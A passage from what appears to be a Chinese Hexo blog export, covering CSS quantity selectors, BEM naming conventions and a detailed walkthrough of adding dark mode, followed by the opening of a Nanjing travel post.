      col-attr round(($i * 100 / 12) %, 6)
@media (min-width 1200px)
  for $i in 1 .. 12
    .col-xl-&#123;$i&#125;
      col-attr round(($i * 100 / 12) %, 6)</code></pre>
<p>灵魂拷问，<code>CSS</code> 真的不适合处理 “重复元素” 的场景嘛？</p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>一些 <code>CSS3</code> 选择器：</p>
<ul>
<li><code>&gt;</code> 子元素选择器</li>
<li><code>+</code> 相邻元素选择器</li>
<li><code>~</code> 兄弟元素选择器</li>
</ul>
<p>一些 <code>CSS3</code> 伪类：</p>
<ul>
<li><code>:only-child</code> 父元素的唯一子元素</li>
<li><code>:first-child</code> 父元素的第一个子元素</li>
<li><code>:last-child</code> 父元素的最后一个子元素</li>
<li><code>:nth-child(n)</code> 父元素的第 N 个子元素</li>
<li><code>:nth-last-child(n)</code> 父元素的倒数第 N 个子元素</li>
<li><code>:nth-child(xn+y)</code> 父元素的第 xN + y 个子元素</li>
<li><code>:nth-last-child(xn+y)</code> 父元素的倒数第 xN + y 个子元素</li>
</ul>
<h2 id="化学反应"><a href="#化学反应" class="headerlink" title="化学反应"></a>化学反应</h2><p>结合以上的 <em>选择器</em> 和 <em>伪类</em> 可以产生一些有趣的 “化学反应”，基于元素的数量来匹配样式。</p>
<p><code>DOM</code> 结构如下：</p>
<pre><code class="html">&lt;ul&gt;
  &lt;li&gt;1&lt;/li&gt;
  &lt;li&gt;2&lt;/li&gt;
  &lt;li&gt;3&lt;/li&gt;
  ...
&lt;/ul&gt;</code></pre>
<h3 id="Andre-Luis"><a href="#Andre-Luis" class="headerlink" title="André Luís"></a>André Luís</h3><p><code>André Luís</code> 方案如下：</p>
<pre><code class="css">/* 只有一个元素时 */
ul&gt;li:nth-child(1):nth-last-child(1) &#123; width: 100%; &#125;  /* 匹配第一个元素 */
ul&gt;li:only-child &#123; width: 100%; &#125;  /* 匹配第一个元素 */</code></pre>
<pre><code class="css">/* 有且仅有两个元素时 */
ul&gt;li:nth-child(1):nth-last-child(2),  /* 匹配第一个元素 */
ul&gt;li:nth-child(2):nth-last-child(1) &#123;  /* 匹配第二个元素 */
    width: 50%;  /* 合起来就是匹配所有元素 */
&#125;</code></pre>
<pre><code class="css">/* 有且仅有三个元素时 */
ul&gt;li:nth-child(1):nth-last-child(3),
ul&gt;li:nth-child(2):nth-last-child(2),
ul&gt;li:nth-child(3):nth-last-child(1) &#123;
    width: 33.3333%;
&#125;</code></pre>
<blockquote>
<p><a href="http://andr3.net/blog/post/142">Clever lists with CSS3 selectors</a></p>
</blockquote>
<h3 id="Lea-Verou"><a href="#Lea-Verou" class="headerlink" title="Lea Verou"></a>Lea Verou</h3><p>上述方案存在一个问题，当元素数量过多时，还是存在大量的重复选择器。升级版的 <code>Lea Verou</code> 方案只需两行固定的选择器即可解决。</p>
<pre><code class="css">/* 只有一个元素时 */
ul&gt;li:first-child:nth-last-child(1) &#123;
    width: 100%;
&#125;</code></pre>
<pre><code class="css">/* 有且仅有两个元素时 */
ul&gt;li:first-child:nth-last-child(2),
ul&gt;li:first-child:nth-last-child(2) ~ li &#123;
    width: 50%;
&#125;</code></pre>
<pre><code class="css">/* 有且仅有三个元素时 */
ul&gt;li:first-child:nth-last-child(3),  /* 匹配第一个元素 */
ul&gt;li:first-child:nth-last-child(3) ~ li &#123;  /* 匹配除第一个元素外的所有元素 */
    width: 33.3333%;
&#125;</code></pre>
<blockquote>
<p><a href="https://lea.verou.me/2011/01/styling-children-based-on-their-number-with-css3/">Styling elements based on sibling count</a></p>
</blockquote>
<h3 id="再改进"><a href="#再改进" class="headerlink" title="再改进"></a>再改进</h3><p>不确定元素数量时：</p>
<pre><code class="css">/* 大于三个元素时 */
ul&gt;li:first-child:nth-last-child(n+3),
ul&gt;li:first-child:nth-last-child(n+3) ~ li &#123;
  width: calc(100% / n);
&#125;</code></pre>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过上述方法即可解决 <strong>向前选择</strong> 和 <strong>重复元素</strong> 这两个问题，遇到实际场景时借助父元素灵活运用即可。</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS - BEM 命名规范</title>
    <url>/2020/11/16/css-bem/</url>
    <content><![CDATA[<p>基于模块化思想的 <code>CSS</code> 样式命名规范。</p>
<span id="more"></span>

<p>&lt;封面摄于江苏·南京的老门东，这儿环境清幽，南京最值得游玩的地方。&gt;</p>
<p>传统的 <code>CSS</code> 是没有命名空间（作用域）这一概念的，当页面模块过多时容易引起样式冲突，这时候可以为样式名称添加 <em>前缀</em> 或 <em>后缀</em> 来解决。</p>
<p><strong>BEM</strong> 便是一套广为流传的命名约定，旨在规范化 <code>CSS</code> 样式名称，便于阅读和<del>编写</del>，以及团队协作。</p>
<h2 id="规范定义"><a href="#规范定义" class="headerlink" title="规范定义"></a>规范定义</h2><p><code>BEM</code> 是 <code>Block（块）</code>、<code>Element（元素）</code>、<code>Modifier（修饰符）</code>的缩写，顾名思义，整套命名规范就是基于这三部分进行组合的。</p>
<h3 id="词组"><a href="#词组" class="headerlink" title="词组"></a>词组</h3><p><strong>Block（块）</strong></p>
<p>块是指具有独立意义的独立实体，也就是页面中的一些独立模块。例如：<code>navbar</code>、<code>article</code>、<code>toc</code>、<code>menu</code>。</p>
<p><strong>Element（元素）</strong></p>
<p>元素是指块的一部分，没有独立的意义，并且在语义上与其块相关。例如：<code>title</code>、<code>content</code>、<code>item</code>、<code>info</code>。</p>
<p><strong>Modifier（修饰符）</strong></p>
<p>修饰符是指块或元素上的标志，使用它们可以更改外观或行为。例如：<code>disabled</code>、<code>checked</code>、<code>success</code>、<code>primary</code>。</p>
<p><img  src="https://pic.izhaoo.com/20201117141547.png"  ><span class="image-caption">BEM - 图示</span></p>
<p>如上图，红色部分是块，绿色部分是元素，蓝色部分是修饰符。</p>
<h3 id="连接符"><a href="#连接符" class="headerlink" title="连接符"></a>连接符</h3><p><strong>__（双下划线）</strong></p>
<p>双下划线用来连接 <em>块</em> 与 <em>元素</em> 。例如：<code>article__title</code>、<code>article__content</code>、<code>article__item</code>。</p>
<p><strong>– （双中划线）</strong></p>
<p>双中划线用来连接 <em>元素</em> 与 <em>修饰符</em>。例如：<code>button--disabled</code>、<code>form--primary</code>、<code>toc--active</code>。</p>
<p><strong>-（中划线）</strong></p>
<p>中划线用来连接 <em>字符</em>，块、元素、修饰符中均可使用。例如：<code>order-form</code>、<code>progress-bar</code>、<code>theme-dark</code>。</p>
<h2 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h2><p>组合上述部分进行命名即可，例如通常我们是这么命名的：</p>
<pre><code class="html">&lt;!-- 传统命名 --&gt;
&lt;article class=&quot;article&quot;&gt;
  &lt;div class=&quot;head&quot;&gt;
    &lt;h1 class=&quot;title&quot;&gt;CSS - BEM 命名规范&lt;/h1&gt;
    &lt;div class=&quot;info&quot;&gt;
      &lt;span&gt;时间：十一月 16, 2020&lt;/span&gt;
      &lt;span&gt;访客：666&lt;/span&gt;
    &lt;/div&gt;
  &lt;/div&gt;
  &lt;div class=&quot;content&quot;&gt;
    &lt;code class=&quot;code&quot;&gt;
      ...
    &lt;/code&gt;
    ...
  &lt;/div&gt;
&lt;/article&gt;</code></pre>
<p>换成 <code>BEM</code> 就可以这么写：</p>
<pre><code class="html">&lt;!-- REM 命名 --&gt;
&lt;article class=&quot;article&quot;&gt;
  &lt;div class=&quot;article__head&quot;&gt;
    &lt;h1 class=&quot;article__title&quot;&gt;CSS - BEM 命名规范&lt;/h1&gt;
    &lt;div class=&quot;article__info&quot;&gt;
      &lt;span&gt;时间：十一月 16, 2020&lt;/span&gt;
      &lt;span&gt;访客：666&lt;/span&gt;
    &lt;/div&gt;
  &lt;/div&gt;
  &lt;div class=&quot;article__content&quot;&gt;
    &lt;code class=&quot;article__code--highlight&quot;&gt;
      ...
    &lt;/code&gt;
    ...
  &lt;/div&gt;
&lt;/article&gt;</code></pre>
<h2 id="一些建议"><a href="#一些建议" class="headerlink" title="一些建议"></a>一些建议</h2><h3 id="配合-CSS-预处理器使用"><a href="#配合-CSS-预处理器使用" class="headerlink" title="配合 CSS 预处理器使用"></a>配合 CSS 预处理器使用</h3><p><code>BEM</code> 最大的诟病是书写太麻烦了，每个样式都像一长串蚂蚁，真是简（you）洁（chou）明（you）了（chang）呢。</p>
<p>在 <code>Sass</code>、<code>Less</code>、<code>Stylus</code> 等 <code>CSS</code> 预处理器大行其道的现在，配合 <code>&amp;（拼接符）</code> 使用会相对简单，如下：</p>
<pre><code class="css">/* Stylus + BEM 编译前 */
.article
  &amp;__head
  &amp;__title
  &amp;__info
  &amp;__content
  &amp;__code
    &amp;--highlight</code></pre>
<pre><code class="css">/* Stylus + BEM 编译后 */
.article__head &#123;&#125;
.article__title &#123;&#125;
.article__info &#123;&#125;
.article__content &#123;&#125;
.article__code &#123;&#125;
.article__code--highlight &#123;&#125;</code></pre>
<p>其实在使用 <code>CSS</code> 预处理器时本身就具备了 <strong>作用域</strong> 的功能，最大的痛点解决了，使用 <code>BEM</code> duck 不必。存在即合理，<code>BEM</code> 还是有它的用武之地的。</p>
<p>先来看看传统的 <code>CSS</code> 预处理代码。</p>
<p><code>BEM</code> 的优势有以下方面：</p>
<pre><code class="css">/* 传统 Stylus 编译前 */
.article
  .head
    .title
    .info
  .content
    .code
      &amp;.highlight</code></pre>
<pre><code class="css">/* 传统 Stylus 编译后 */
.article &#123;&#125;
.article .head &#123;&#125;
.article .head .title &#123;&#125;
.article .head .info &#123;&#125;
.article .content &#123;&#125;
.article .content .code &#123;&#125;
.article .content .code.highlight &#123;&#125;</code></pre>
<p><strong>性能</strong></p>
<p>可以看到传统 <code>Stylus</code> 编译后的 <code>CSS</code> 样式中，选择器存在大量堆叠。而 <code>CSS</code> 引擎查找样式表时是根据 <em>从左到右</em> 的顺序去匹配规则的，这样就会浪费很多的查询性能，且开销随着嵌套层数呈几何级数递增。但是采用 <code>BEM</code> + <code>Stylus</code> 的写法一般就生成一条选择器样式，只需查询一次，做到 “指哪打哪”。</p>
<p><strong>语义化</strong></p>
<p>前面说到传统 <code>Stylus</code> 编译结果中存在大量重复嵌套，在 <code>debug</code> 时也是不直观的。而 <code>BEM</code> + <code>Stylus</code> 编译生成后则一目了然。</p>
<h3 id="减少连接层数"><a href="#减少连接层数" class="headerlink" title="减少连接层数"></a>减少连接层数</h3><p><code>BEM</code> 本就麻烦，还要连接个几层，年轻人耗子尾汁。</p>
<ul>
<li><code>block__element--modifier</code> =&gt; 一只蚂蚁，一个头，一个身子，一个屁股。</li>
<li><code>block__block__element_element--modifier--modifier</code> =&gt; 一只蚂蚁，许多头，许多身子，许多屁股。</li>
</ul>
<p><code>B + E + M</code> 足矣，没有 <code>nB + nE +nM</code> 这样的写法。必须对页面元素进行扁平化，抽象到只有一层结构。</p>
<h3 id="恰当使用"><a href="#恰当使用" class="headerlink" title="恰当使用"></a>恰当使用</h3><p>在编写页面级组件时可以使用传统写法，毕竟无需多次复用；在编写全局组件时使用 <code>BEM</code> 规范，约定俗成便于团队维护。</p>
<p>最后：<code>BEM</code> 看着太难受了，我一般不用。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote>
<p><a href="http://getbem.com/introduction/">Introduction - BEM — Block Element Modifier</a></p>
</blockquote>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>适配深色模式</title>
    <url>/2020/11/12/adapt-to-dark-mode/</url>
    <content><![CDATA[<p>为博客适配深色模式。</p>
<span id="more"></span>

<p>&lt;封面摄于江苏·南京的总统府，小潘同学就是在这被猫猫挠了。&gt;</p>
<h2 id="滤镜反色"><a href="#滤镜反色" class="headerlink" title="滤镜反色"></a>滤镜反色</h2><p>最偷懒的方式就是用 <code>CSS3</code> 的滤镜对整个页面进行反色，只需一行代码。</p>
<pre><code class="css">html[theme=&#39;dark-mode&#39;] &#123;
  filter: invert(1) hue-rotate(180deg);
&#125;</code></pre>
<p><img  src="https://pic.izhaoo.com/20201112114537.jpg"  ><span class="image-caption">使用CSS3滤镜进行反色</span></p>
<p>这时候会发现有个小问题，就是图片也会被反色，形成类似胶卷底片的效果。那么只需将图片再反色回来即可。</p>
<pre><code class="css">html[theme=&#39;dark-mode&#39;] img&#123;
  filter: invert(1) hue-rotate(180deg);
&#125;</code></pre>
<p><img  src="https://pic.izhaoo.com/20201112114752.jpg"  ><span class="image-caption">适配图片</span></p>
<p>分分钟搞定，但是似乎非黑即白，还不够细腻。</p>
<blockquote>
<p><a href="https://zhuanlan.zhihu.com/p/183812218?utm_source=com.microsoft.emmx">一行代码使用CSS的黑暗模式</a></p>
</blockquote>
<h2 id="媒体查询和样式变量"><a href="#媒体查询和样式变量" class="headerlink" title="媒体查询和样式变量"></a>媒体查询和样式变量</h2><p>媒体查询 (@media) 中的 <code>prefers-color-scheme</code> 用于检测用户是否有将系统的主题色设置为浅色或者深色，配合 <code>CSS Variable</code> 我们可以为浅色或深色模式单独匹配样式，实现更细腻的深色模式。</p>
<h3 id="Media-Query"><a href="#Media-Query" class="headerlink" title="Media Query"></a>Media Query</h3><p><code>prefers-color-scheme</code> 有以下三个值：</p>
<ul>
<li>light: 检测出系统处于 <em>浅色</em> 模式</li>
<li>dark: 检测出系统处于 <em>深色</em> 模式</li>
<li>no-preference: 并未检测出系统所处的颜色模式，可能是出于系统不支持或者被隐私保护拦截等因素</li>
</ul>
<p>使用方法如下：</p>
<pre><code class="html">&lt;div class=&quot;background&quot;&gt;
  &lt;span class=&quot;text&quot;&gt;&lt;/span&gt;
&lt;/div&gt;</code></pre>
<pre><code class="css">@media (prefers-color-scheme: dark) &#123;  /* 深色模式 */
  .background &#123; background: #333333; &#125;
  .text &#123; color: #ffffff; &#125;
&#125;

@media (prefers-color-scheme: light) &#123;  /* 浅色模式 */
  .background &#123; background: #ffffff; &#125;
  .text &#123; color: #333333; &#125;
&#125;</code></pre>
<p>兼容性如下，不过对于不支持该属性的浏览器也能忽略该属性从而向下兼容。</p>
<p><img  src="https://pic.izhaoo.com/20201113102014.jpg"  ><span class="image-caption">浏览器兼容性</span></p>
<p>通过该属性，我们即可检测出系统当前所处的颜色模式，并对样式进行单独配置。</p>
<blockquote>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/@media/prefers-color-scheme">MDN: prefers-color-scheme</a></p>
</blockquote>
<h3 id="CSS-Variable"><a href="#CSS-Variable" class="headerlink" title="CSS Variable"></a>CSS Variable</h3><p>通过 <code>prefers-color-scheme</code> 匹配颜色模式，但是为所有元素都单独定制两套颜色样式显然很麻烦，后期也难以维护。</p>
<p>一个页面内的颜色方案通常比较统一，也就那么几种颜色，所以我们可以通过 CSS变量 (CSS Variable) 为颜色进行规整，快速切换颜色模式。</p>
<pre><code class="css">:root &#123;
  --color-background: #ffffff;
  --color-text: #33333d;
&#125;

@media (prefers-color-scheme: dark) &#123;
  :root &#123;
    --color-background: #1e2128;
    --color-text: #dddddd;
  &#125;
&#125;

.background &#123; background: var(--color-background); &#125;
.text &#123; color: var(--color-text); &#125;</code></pre>
<h2 id="手动切换"><a href="#手动切换" class="headerlink" title="手动切换"></a>手动切换</h2><p>通过媒体查询和样式变量我们可以跟随系统设置，实现自动切换颜色模式。但是这样还不够友好，有以下场景：</p>
<ol>
<li>浏览器不支持 <code>prefers-color-scheme</code>，无法自动切换颜色模式</li>
<li>系统处于深色模式状态，但是我又想让该网页单独显示浅色模式</li>
</ol>
<p>所以还需要添加一个按钮，让用户手动切换颜色模式。</p>
<h3 id="HTML-Attribute"><a href="#HTML-Attribute" class="headerlink" title="HTML Attribute"></a>HTML Attribute</h3><p>实现用户手动切换颜色模式，首先需要一个“全局变量”来保存当前颜色模式，并且让 <code>CSS</code> 识别该“变量”，匹配颜色模式。我们可以直接在 <code>html</code> 标签（根元素）设定一个属性 <code>color-mode</code>，属性值有 <code>light</code> 和 <code>dark</code>，可以通过 <code>CSS</code> 的属性选择器直接匹配，用户点击切换按钮时可以通过 <code>JS</code> 直接修改该属性。</p>
<pre><code class="html">&lt;html color-mode=&quot;dark&quot;&gt;
  &lt;div class=&quot;background&quot;&gt;
    &lt;span class=&quot;text&quot;&gt;&lt;/span&gt;
  &lt;/div&gt;
&lt;/html&gt;</code></pre>
<pre><code class="css">:root &#123;
  --color-background: #ffffff;
  --color-text: #33333d;
&#125;

[color-mode=&#39;dark&#39;] &#123;
  :root &#123;
    --color-background: #1e2128;
    --color-text: #dddddd;
  &#125;
&#125;

.background &#123; background: var(--color-background); &#125;
.text &#123; color: var(--color-text); &#125;</code></pre>
<h3 id="Stylus"><a href="#Stylus" class="headerlink" title="Stylus"></a>Stylus</h3><p><code>hexo-theme-zhaoo</code> 主题使用了 <code>Stylus</code> 预处理器，基于 <strong>变量</strong>、<strong>函数</strong> 等特性可以进一步抽离样式，便于维护。</p>
<pre><code class="css">/* variables.styl */

/* light */
$color-background = unquote(hexo-config(&#39;color.background&#39;) || #ffffff)
$color-background-secondary = unquote(hexo-config(&#39;color.background-secondary&#39;) || #f6f8fa)
$color-background-rgb = 255, 255, 255
$color-text = unquote(hexo-config(&#39;color.text&#39;) || #33333d)
$color-text-secondary = unquote(hexo-config(&#39;color.text-secondary&#39;) || #4e4e4e)
$color-text-third = unquote(hexo-config(&#39;color.text-third&#39;) || #999999)
/* dark */
$color-background-dark = unquote(hexo-config(&#39;color.background-dark&#39;) || #1e2128)
$color-background-secondary-dark = unquote(hexo-config(&#39;color.background-secondary-dark&#39;) || #1a1d22)
$color-background-rgb-dark = 30, 33, 40
$color-text-dark = unquote(hexo-config(&#39;color.text-dark&#39;) || #dddddd)
$color-text-secondary-dark = unquote(hexo-config(&#39;color.text-secondary-dark&#39;) || #9899ab)
$color-text-third-dark = unquote(hexo-config(&#39;color.text-third-dark&#39;) || #7d8594)</code></pre>
<pre><code class="css">/* color-mode.styl */

:root
  --color-background $color-background
  --color-background-secondary $color-background-secondary
  --color-background-rgb $color-background-rgb
  --color-text $color-text
  --color-text-secondary $color-text-secondary
  --color-text-third $color-text-third
dark()
  --color-background $color-background-dark
  --color-background-secondary $color-background-secondary-dark
  --color-background-rgb $color-background-rgb-dark
  --color-text $color-text-dark
  --color-text-secondary $color-text-secondary-dark
  --color-text-third $color-text-third-dark
@media (prefers-color-scheme dark)
  :root:not([color-mode])
    dark()
[color-mode=&#39;dark&#39;]
  dark()</code></pre>
<h3 id="触发器"><a href="#触发器" class="headerlink" title="触发器"></a>触发器</h3><p>触发器就是一个按钮，点击后修改 <code>html</code> 标签的 <code>color-mode</code> 属性，切换颜色模式。比较简单，直接上代码了：</p>
<pre><code class="html">&lt;i class=&quot;iconfont iconmoono&quot; id=&quot;color-toggle&quot; color-toggle=&quot;light&quot;&gt;&lt;/i&gt;</code></pre>
<pre><code class="javascript">var switchColorMode = function () &#123;
  if (!document.getElementById(&#39;color-toggle&#39;)) return;
  document.getElementById(&#39;color-toggle&#39;).addEventListener(&#39;click&#39;, function () &#123;
    var mode = this.getAttribute(&#39;color-toggle&#39;) === &#39;light&#39; ? &#39;dark&#39; : &#39;light&#39;;
    document.documentElement.setAttribute(htmlAttribute, mode);
  &#125;);
&#125;
switchColorMode();</code></pre>
<p>至此，用户就可以点击按钮手动切换颜色模式了。</p>
<h3 id="缓存状态"><a href="#缓存状态" class="headerlink" title="缓存状态"></a>缓存状态</h3><p>该方案还存在问题，跳转页面或刷新页面，颜色模式就会切回到默认。（用户：你***逗我玩呢？）所以我们需要让浏览器缓存用户手动切换的颜色模式，之后加载页面时默认以该模式渲染。背面经环节：前端缓存方案有 <code>cookies</code>、<code>localStorage</code>、<code>sessionStorage</code>、<code>Web SQL</code>、<code>IndexedDB</code>…… </p>
<p>用最方便的 <code>localStorage</code> 储存用户切换到颜色模式即可，在用户点击按钮后将更新的颜色模式通过 <code>localStorage.setItem</code> 存储，再在页面渲染时通过 <code>localStorage.getItem</code> 获取颜色模式并渲染即可，<code>key</code> 为 <code>color-mode</code>。</p>
<p>我们还需要解决一个问题，<strong>系统自动配置</strong> (媒体查询) 与 <strong>用户手动配置</strong> (按钮切换) 之间的同步和冲突问题。例如：1. 在固定时段（晚上或白天），页面渲染时按用户切换的颜色模式加载。2. 在时段改变后（白天变为晚上），页面渲染时按系统颜色模式渲染。</p>
<p>我们只需要再添加一组 <code>key</code> 为 <code>color-mode-media-query</code> 的 <code>localStorage</code>，缓存媒体查询的颜色模式。渲染时判断 <em>当前媒体查询</em> 与 <em>缓存</em> 是否相等，相等说明处于同一时段，不等说明时段已改变，从而决定渲染方式。</p>
<p>最后，这段 <code>JS</code> 需要添加到 <code>&lt;/body&gt;</code> 标签前面加载，不然会闪屏。</p>
<p>完整 <code>JS</code> 代码如下：</p>
<pre><code class="javascript">!function (window, document) &#123;
  var rootElement = document.documentElement;
  var toggleElement = document.getElementById(&#39;color-toggle&#39;);
  var highlightElement = document.getElementsByName(&#39;highlight-style&#39;);
  var modeStorageKey = &#39;color-mode&#39;;
  var mediaQueryStorageKey = &#39;color-mode-media-query&#39;;
  var htmlAttribute = &#39;color-mode&#39;;
  var toggleAttribute = &#39;color-toggle&#39;;

  var getMediaQuery = function () &#123;
    return window.matchMedia(&#39;(prefers-color-scheme: dark)&#39;).matches ? &#39;dark&#39; : &#39;light&#39;;
  &#125;

  var getModeStorage = function () &#123;
    return localStorage.getItem(modeStorageKey);
  &#125;

  var setModeStorage = function (mode) &#123;
    localStorage.setItem(modeStorageKey, mode);
  &#125;

  var getMediaQueryStorage = function () &#123;
    return localStorage.getItem(mediaQueryStorageKey);
  &#125;

  var setMediaQueryStorage = function (mode) &#123;
    localStorage.setItem(mediaQueryStorageKey, mode);
  &#125;

  var setColorMode = function (mode) &#123;
    rootElement.setAttribute(htmlAttribute, mode);
    setModeStorage(mode);
  &#125;

  var setIcon = function (mode) &#123;
    if (!toggleElement) return;
    var addIconName = mode === &#39;light&#39; ? &#39;iconmoono&#39; : &#39;iconsuno&#39;;
    var removeIconName = mode === &#39;light&#39; ? &#39;iconsuno&#39; : &#39;iconmoono&#39;;
    toggleElement.classList.remove(removeIconName);
    toggleElement.classList.add(addIconName);
    toggleElement.setAttribute(toggleAttribute, mode);
  &#125;

  var setHighlightStyle = function (mode) &#123;
    highlightElement.forEach(function (item) &#123;
      item.disabled = !(item.getAttribute(&#39;mode&#39;) === mode);
    &#125;);
  &#125;

  var loadColorMode = function (mode) &#123;
    var mode = mode || getModeStorage() || getMediaQuery();
    if (getMediaQuery() === getMediaQueryStorage()) &#123;
      mode = getModeStorage();
    &#125; else &#123;
      mode = getMediaQuery();
      setMediaQueryStorage(mode);
    &#125;
    setColorMode(mode);
    setIcon(mode);
    setHighlightStyle(mode);
  &#125;

  var switchColorMode = function () &#123;
    if (!toggleElement) return;
    toggleElement.addEventListener(&#39;click&#39;, function () &#123;
      var mode = this.getAttribute(toggleAttribute) === &#39;light&#39; ? &#39;dark&#39; : &#39;light&#39;;
      setColorMode(mode);
      setIcon(mode);
      setHighlightStyle(mode);
    &#125;);
  &#125;

  loadColorMode();
  switchColorMode();
&#125;(window, document);</code></pre>
<blockquote>
<p>[你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持] (<a href="https://blog.skk.moe/post/hello-darkmode-my-old-friend/">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a>)</p>
</blockquote>
<h2 id="适配特殊样式"><a href="#适配特殊样式" class="headerlink" title="适配特殊样式"></a>适配特殊样式</h2><p>大部分元素可以通过 <code>CSS</code> 属性直接匹配样式，但是仍有一部分元素需要通过“特殊”方法进行处理。</p>
<h3 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h3><p>适配首屏云朵，其实就是张 <code>PNG</code> 图片，要是 <code>PNG</code> 能用 <code>CSS</code> 控制颜色就好了。</p>
<p><img  src="https://pic.izhaoo.com/20201112104351.jpg"  ><span class="image-caption">适配PNG</span></p>
<p>从张鑫旭大佬的博客找到了解决方案，可以用 <code>CSS3</code> 滤镜中的投影 (filter: drop-shadow) 进行上色。但是需要做一些处理，将原图隐藏而阴影显示，其实只要将原图偏移出视口，再将阴影偏移回正确位置即可。</p>
<pre><code class="css">img &#123;
  position: absolute;
  width: 100vw;
  left: -100vw;  /* 原图偏移出视口 */
  filter: drop-shadow(var(--color-background) 100vw 0px);  /* 阴影进行上色，并偏移回原位置 */
&#125;</code></pre>
<blockquote>
<p><a href="https://www.zhangxinxu.com/wordpress/2016/06/png-icon-change-color-by-css/">PNG格式小图标的CSS任意颜色赋色技术</a></p>
</blockquote>
<h3 id="SVG"><a href="#SVG" class="headerlink" title="SVG"></a>SVG</h3><p>接下来适配首屏波浪，小图标等 <code>SVG</code> 内容。</p>
<p><img  src="https://pic.izhaoo.com/20201112112109.jpg"  ><span class="image-caption">适配SVG</span></p>
<p>首先 <code>SVG</code> 也是可以用上面提到的 <code>filter: drop-shadow</code> 进行上色的。</p>
<p>另外，也可以用 <code>SVG</code> 标签中的 <code>fill</code> 属性进行赋色，如下：</p>
<pre><code class="xml">&lt;svg class=&quot;preview-waves&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;
  viewBox=&quot;0 24 150 28&quot; preserveAspectRatio=&quot;none&quot; shape-rendering=&quot;auto&quot;&gt;
  &lt;defs&gt;
    &lt;path id=&quot;gentle-wave&quot; d=&quot;M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z&quot; /&gt;
  &lt;/defs&gt;
  &lt;g class=&quot;preview-parallax&quot;&gt;
    &lt;use xlink:href=&quot;#gentle-wave&quot; x=&quot;48&quot; y=&quot;0&quot; fill=&quot;rgba(var(--color-background-rgb), 0.7&quot; /&gt;  //通过 fill 属性进行赋色
    &lt;use xlink:href=&quot;#gentle-wave&quot; x=&quot;48&quot; y=&quot;3&quot; fill=&quot;rgba(var(--color-background-rgb), 0.5)&quot; /&gt;  //通过 fill 属性进行赋色
    &lt;use xlink:href=&quot;#gentle-wave&quot; x=&quot;48&quot; y=&quot;5&quot; fill=&quot;rgba(var(--color-background-rgb), 0.3)&quot; /&gt;  //通过 fill 属性进行赋色
    &lt;use xlink:href=&quot;#gentle-wave&quot; x=&quot;48&quot; y=&quot;7&quot; fill=&quot;rgb(var(--color-background-rgb))&quot; /&gt;  //通过 fill 属性进行赋色
  &lt;/g&gt;
&lt;/svg&gt;</code></pre>
<h3 id="rgba"><a href="#rgba" class="headerlink" title="rgba"></a>rgba</h3><p>对应含有透明通道的颜色 (rgba)，如果在 <code>rgba()</code> 中包裹 CSS变量，<code>stylus</code> 会解析出错，这应该是 <code>stylus</code> 的一个 <code>bug</code>。我们可以用 <code>stylus</code> 中的 <code>@css</code> 指令解决，被包裹在 <code>@css</code> 中的内容将不会被 <code>stylus</code> 解析，而是直接以 <code>CSS</code> 的形式输出。如下：</p>
<pre><code class="css">@css &#123;
  .menu &#123;
    background-color: rgba(var(--color-background-rgb), 0.7);
  &#125;
  .navbar &#123;
    background-color: rgba(var(--color-background-rgb), 0.8)s;
  &#125;
&#125;</code></pre>
<h3 id="highlight"><a href="#highlight" class="headerlink" title="highlight"></a>highlight</h3><p>代码高亮也需要做适配，可以引入浅色和深色两套代码高亮样式，默认用 <code>disabled</code> 属性禁用，然后在页面渲染时根据颜色模式开启对应的代码高亮样式。如下：</p>
<pre><code class="ejs">&lt;% if(theme.highlight.enable)&#123; %&gt;
&lt;% if(theme.vendors.highlight_css)&#123; %&gt;
&lt;% for (i in theme.highlight.style) &#123; %&gt;
&lt;% style = theme.highlight.style[i].toLowerCase().replace(/(?&lt;!([0-9]))\s(?!([0-9]))/g, &#39;-&#39;).replace(/\s/g, &#39;&#39;) %&gt;  //引入多套样式
&lt;%- css(&#123;href: theme.vendors.highlight_css + style + &#39;.min.css&#39;, name: &#39;highlight-style&#39;, mode: i&#125;) %&gt;
&lt;% &#125; %&gt;
&lt;% &#125;else&#123; %&gt;
&lt;%- css(&#39;lib/highlight/a11y-dark.css&#39;)%&gt;
&lt;% &#125;&#125; %&gt;</code></pre>
<pre><code class="javascript">var setHighlightStyle = function (mode) &#123;
  highlightElement.forEach(function (item) &#123;
    item.disabled = !(item.getAttribute(&#39;mode&#39;) === mode);
  &#125;);
&#125;</code></pre>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>主题</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>金陵之旅</title>
    <url>/2020/11/11/travel-to-nanjing/</url>
    <content><![CDATA[<p>我离开了南京，从此不想再来。</p>
<span id="more"></span>   

<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1392286938&auto=0&height=66"></iframe>

<p>我对这座城市一直不感冒，作为六朝古都，南京承载了很长一段历史，掩埋了太多的故事和枯骨。</p>
<p><strong>01</strong></p>
<p>旅馆安顿在老门东，飞猪买的票很便宜。</p>
<p><img  src="https://pic.izhaoo.com/20201124143307.jpg"  ><span class="image-caption">鸭血粉丝汤</span></p>
<p>到南京已经下午一点了，就在边上找了家店吃早饭。鸭血粉丝汤，不戳不戳，味精放得多就是鲜；鸡鸣汤包，也海星，馅料挺嫩；赤豆元宵，属实不行，太甜太腻了。</p>
<p><img  src="https://pic.izhaoo.com/20201112102531.jpg"  ><span class="image-caption">老门东</span></p>
